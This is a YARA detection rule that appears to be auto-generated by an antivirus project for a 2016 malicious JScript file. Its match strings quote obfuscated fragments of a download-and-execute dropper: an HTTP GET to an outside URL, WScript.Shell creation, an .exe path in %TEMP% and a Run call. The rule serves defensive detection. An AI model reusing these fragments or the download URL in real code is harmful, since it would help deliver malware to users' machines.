rule sig_20160330_36ca3d62e1243298e51320774e4cbcba {
  meta:
    description = "datamaliciousorder - file 20160330_36ca3d62e1243298e51320774e4cbcba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "10a8eeef83130183e739c26cef0595abf07df9c910ffe41cda85b7ce96cbf755"

  strings:
    $s1  = "_AJ[_HL](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "function _F(_JM, _WM){_O = _O * 1; return _JM - _WM;};" fullword ascii
    $s3  = "var _N = function _LG() {return WScript[_T](\"WScript\"+\".Shell\");}(), _C = 11;" fullword ascii
    $s4  = "if (_AJ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _FN() {return _N[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lkK5ttZWQN5.ex\" + \"e\";};" fullword ascii
    $s6  = "function _A(){return _JE + \"\";};" fullword ascii
    $s7  = "function _RS(_K){_N[\"Run\"](_K, _O, _O);};" fullword ascii
    $s8  = "function _J() {return ((_H0 == true) && (_H0 == _HI)) ? 1 : _O;};" fullword ascii
    $s9  = "function _Z()" fullword ascii
    $s10 = "function _W(){return 22;};" fullword ascii
    $s11 = "function _BX(){return _T;};" fullword ascii
    $s12 = "return _F(_JA, _QJ);" fullword ascii
    $s13 = " while (_S){" fullword ascii
    $s14 = "var _BV = new this[\"Date\"]();" fullword ascii
    $s15 = "function _Q(_I) {var _B = (1, 2, 3, 4, 5, _I); return _B;};" fullword ascii
    $s16 = "_H0 = true; " fullword ascii
    $s17 = "var _H0 = false;" fullword ascii
    $s18 = "_HI = true; " fullword ascii
    $s19 = "var _HI = false;" fullword ascii
    $s20 = "var _C0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}